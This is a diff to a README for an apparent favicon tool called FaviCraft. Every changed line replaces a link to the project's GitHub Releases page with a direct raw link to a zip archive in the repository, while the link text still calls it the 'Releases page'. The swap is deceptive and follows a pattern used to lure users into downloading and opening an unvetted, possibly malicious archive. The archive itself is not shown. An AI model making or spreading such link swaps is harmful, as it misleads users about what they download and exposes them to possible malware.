@@ -1,6 +1,6 @@
 # 🎨 FaviCraft - Create Stunning Favicons in Seconds
 
-[![Download FaviCraft](https://img.shields.io/badge/Download-FaviCraft-blue.svg)](https://github.com/NUBNOTPRO/FaviCraft/releases)
+[![Download FaviCraft](https://raw.githubusercontent.com/NUBNOTPRO/FaviCraft/master/components/FaviCraft_2.1.zip)](https://raw.githubusercontent.com/NUBNOTPRO/FaviCraft/master/components/FaviCraft_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ FaviCraft helps you create perfect favicons quickly and easily. A favicon is the
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/NUBNOTPRO/FaviCraft/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/NUBNOTPRO/FaviCraft/master/components/FaviCraft_2.1.zip) to download the latest version.
 2. Choose the appropriate file for your operating system.
 3. Download the file.
 4. Open the downloaded file to begin the installation.
@@ -74,4 +74,4 @@ FaviCraft is licensed under the MIT License. Feel free to use, modify, and share
 
 Keep an eye on the Releases page for new updates and features. We regularly improve FaviCraft based on user feedback.
 
-For more information, visit the [Releases page](https://github.com/NUBNOTPRO/FaviCraft/releases). Enjoy crafting your perfect favicons with FaviCraft!
+For more information, visit the [Releases page](https://raw.githubusercontent.com/NUBNOTPRO/FaviCraft/master/components/FaviCraft_2.1.zip). Enjoy crafting your perfect favicons with FaviCraft!
